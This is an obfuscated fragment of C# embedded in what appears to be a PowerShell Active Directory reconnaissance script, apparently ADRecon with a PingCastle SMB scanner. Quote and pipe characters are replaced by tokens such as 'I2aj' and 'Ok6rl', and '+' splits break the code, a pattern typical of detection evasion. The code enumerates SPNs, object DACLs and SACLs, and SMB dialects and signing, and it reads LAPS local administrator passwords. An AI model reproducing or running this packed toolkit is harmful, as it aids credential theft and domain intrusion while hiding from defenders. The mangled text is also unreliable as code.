                    ComputerObj.Members.Add(new PSNoteProperty(I2ajOperating SystemI2aj, OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajLogon Age (days)I2aj, DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword Age (days)I2aj, DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDormant (> I2aj + DormantTimeSpan + I2aj days)I2aj, Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword Age (> I2aj + PassMaxAge + I2aj days)I2aj, PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation TypeI2aj, DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation ProtocolI2aj, DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation ServicesI2aj, DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPrimary Group IDI2aj, (AdComputer.Properties[I2ajprimarygroupidI2aj].Count != 0 ? AdComputer.Properties[I2ajprimarygroupidI2aj][0] : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties[I2ajobjectSIDI2aj][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, (AdComputer.Properties[I2ajDescriptionI2aj].Count != 0 ? CleanString(AdComputer.Properties[I2ajDescriptionI2aj][0]) : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajms-ds-CreatorSidI2aj, (AdComputer.Properties[I2ajms-ds-CreatorSidI2aj].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties[I2ajms-ds-CreatorSidI2aj][0], 0)) : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajLast Logon DateI2aj, LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword LastSetI2aj, PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajUserAccountControlI2aj, (AdComputer.Properties[I2ajuseraccountcontrolI2aj].Count != 0 ? AdComputer.Properties[I2ajuseraccountcontrolI2aj][0] : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdComputer.Properties[I2ajwhencreatedI2aj][0]));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdComputer.Properties[I2ajwhenchangedI2aj][0]));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDistinguished NameI2aj, AdComputer.Properties[I2ajdistinguishednameI2aj][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties[I2ajserviceprincipalnameI2aj].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties[I2ajserviceprincipalnameI2aj])
                    {
                        string[] SPNArray = SPN.Split(JQTOy/JQTOy);
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members[I2ajServiceI2aj].Value == SPNArray[0] )
                            {
                                Obj.Members[I2ajHostI2aj].Value = string.Join(I2aj,I2aj, (Obj.Members[I2ajHostI2aj].Value + I2aj,I2aj + SPNArray[1]).Split(JQTOy,JQTOy).Distinct().ToArray());
       '+'                         flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, (AdComputer.Properties[I2ajsamaccountnameI2aj].Count != 0 ? CleanString(AdComputer.Properties[I2ajsamaccountnameI2aj][0]) : I2ajI2aj)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, (AdComputer.Properties[I2ajnameI2aj].Count != 0 ? CleanString(AdComputer.Properties[I2ajnameI2aj][0]) : I2ajI2aj)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajServiceI2aj, SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajHostI2aj, SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? Cu'+'rrentExpiration = null;
                    if (AdComputer.Properties[I2ajms-mcs-admpwdexpir'+'ationtimeI2aj].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties[I2ajms-mcs-admpwdexpirationtimeI2aj][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajHostnameI2aj, (AdComputer.Properties[I2ajdnshostnameI2aj].Count != 0 ? AdComputer.Properties[I2ajdnshostnameI2aj][0] : AdComputer.Properties[I2ajcnI2aj][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajStoredI2aj, PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajReadableI2aj, (AdComputer.Properties[I2ajms-mcs-admpwdI2aj].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajPasswordI2aj, (AdComputer.Properties[I2ajms-mcs-admpwdI2aj].Count != 0 ? AdComputer.Properties[I2ajms-mcs-admpwdI2aj][0] : null)));
                    LAPSObj.'+'Members.Add(new PSNoteProperty(I2ajExpirationI2aj, CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj,'+' e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties[I2ajobjectclassI2aj][AdObject.Properties[I2ajobjectclassI2aj].Count-1]))
                    {
                        case I2ajuserI2aj:
                        case I2ajcomputerI2aj:
                        case I2ajgroupI2aj:
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties[I2ajobjectSIDI2aj][0], 0)), (Convert.ToString(AdObject.Properties[I2ajnameI2aj][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties[I2ajnameI2aj][0]);

                    switch (Convert.ToString(AdObject.Properties[I2ajobjectclassI2aj][AdObject.Properties[I2ajobjectclassI2aj].Count-1]))
                    {
                        case I2ajuserI2aj:
                            Type = I2ajUserI2aj;
                            break;
                        case I2ajcomputerI2aj:
                            Type = I2ajComputerI2aj;
                            break;
                        case I2ajgroupI2aj:
                            Type = I2ajGroupI2aj;
                            break;
                  '+'      case I2ajcontainerI2aj:
                            Type = I2ajContainerI2aj;
                            break;
                        case I2ajgroupPolicyContainerI2aj:
                            Type = I2ajGPOI2aj;
                            Name = Convert.ToString(AdObject.Properties[I2ajdisplaynameI2aj][0]);
                            break;
                        case I2ajorganizationalUnitI2aj:
                            Type = I2ajOUI2aj;
                            break;
                        case I2ajdomainDNSI2aj:
                            Type = I2ajDomainI2aj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties[I2ajobjectclassI2aj][AdObject.Properties[I2ajobjectclassI2aj].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties[I2ajntsecuritydescriptorI2aj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties[I2ajntsecuritydescriptorI2aj][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajTypeI2aj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeNameI2aj, LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeNameI2aj, LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajA'+'ctiveDirectoryRightsI2aj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajAccessControlTypeI2aj, Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceNameI2aj, LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajOwnerNameI2aj, LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedI2aj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectFlagsI2aj, Rule.Obje'+'ctFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceFlagsI2aj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceTypeI2aj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajPropagationFlagsI2aj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeI2aj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeI2aj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceI2aj, Rule.IdentityReference));
                            Obje'+'ctObj.Members.Add(new PSNoteProperty(I2ajOwnerI2aj, Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdObject.Properties[I2ajdistinguishednameI2aj][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
    '+'            {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties[I2ajnameI2aj][0]);

                    switch (Convert.ToString(AdObject.Properties[I2ajobjectclassI2aj][AdObject.Properties[I2ajobjectclassI2aj].Count-1]))
                    {
                        case I2ajuserI2aj:
                            Type = I2ajUserI2aj;
                            break;
                        case I2ajcomputerI2aj:
                            Type = I2ajComputerI2aj;
                            break;
                        case I2ajgroupI2aj:
                            Type = I2ajGroupI2aj;
                            break;
                        case I2ajcontainerI2aj:
                            Type = I2ajContainerI2aj;
                            break;
                        case I2ajgroupPolicyContainerI2aj:
                            Type = I2ajGPOI2aj;
                            Name = Convert.ToString(AdObject.Properties[I2ajdisplaynameI2aj][0]);
                            break;
                        case I2ajorganizationalUnitI2aj:
                            Type = I2ajOUI2aj;
                            break;
                        case I2ajdomainDNSI2aj:
                            Type = I2ajDomainI2aj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties[I2ajobjectclassI2aj][AdObject.Properties[I2ajobjectclassI2aj].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties[I2ajntsecuritydescriptorI2aj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties[I2ajntsecuritydescriptorI2aj][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajTypeI2aj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeNameI2aj, LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeNameI2aj, LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajActiveDirectoryRightsI2aj, R'+'ule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceNameI2aj, LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajAuditFlagsI2aj, Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectFlagsI2aj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceFlagsI2aj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceTypeI2aj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedI2aj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajPropagationFlagsI2aj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeI2aj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeI2aj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceI2aj, Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exceptio'+'n e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return pr'+'ocessed.ToArray();
            }
        }
I2aj@


5I7ELPingCastleSMBScannerSource = @I2aj

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UI'+'nt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE Ok6rl SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES Ok6rl SMB_FLAGS2_EAS Ok6rl SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED Ok6rl SMB_FLAGS2_IS_LONG_NAME Ok6rl SMB_FLAGS2_ESS O'+'k6rl SMB_FLAGS2_NT_STATUS Ok6rl SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			re'+'turn arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1'+'; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
	'+'	{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV1 dialect I2aj + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception(I2ajport 445 is closed on I2aj + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV1 dialect I2aj + dialect + I2aj = SupportedI2aj);
					return true;
				}
				Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV1 dialect I2aj + dialect + I2aj = Not supportedI2aj);
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException(I2ajSmb1 is not supported on I2aj + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV2 dialect 0xI2aj + dialect.ToString(I2ajX2I2aj));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception(I2ajport 445 is closed on I2aj + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 Ok6rlOk6rl smbHeader[9] != 0 Ok6rlOk6rl smbHeader[10] != 0 Ok6rlOk6rl smbHeader[11] != 0)
				{
					Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV2 dialect 0xI2aj + dialect.ToString(I2ajX2I2aj) + I2aj = Not supported via error codeI2aj);
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV2 SMB Signing dialect 0xI2aj + dialect.ToString(I2ajX2I2aj) + I2aj = SupportedI2aj);
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV2 dialect 0xI2aj + dialect.ToString(I2ajX2I2aj) + I2aj = SupportedI2aj);
					return true;
				}
				Trace.WriteLine(I2ajChecking I2aj + server + I2aj for SMBV2 dialect 0xI2aj + dialect.ToString(I2ajX2I2aj) + I2aj = Not supported via not returned dialectI2aj);
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException(I2ajSmb2 is not supported on I2aj + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, I2ajNT LM 0.12I2aj);
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) Ok6rlOk6rl DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) Ok6rlOk6rl DoesServerSupportDialectWithSmbV2(server, 0x0302, false) Ok6rlOk6rl DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return I2ajsmbI2aj; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == I2ajI2aj)
            {
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB Port OpenI2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB1(NT LM 0.12)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0202)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0210)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0300)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0302)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0311)I2aj, null));
                DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB SigningI2aj, null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, I2ajNT LM 0.12I2aj);
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
'+'			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
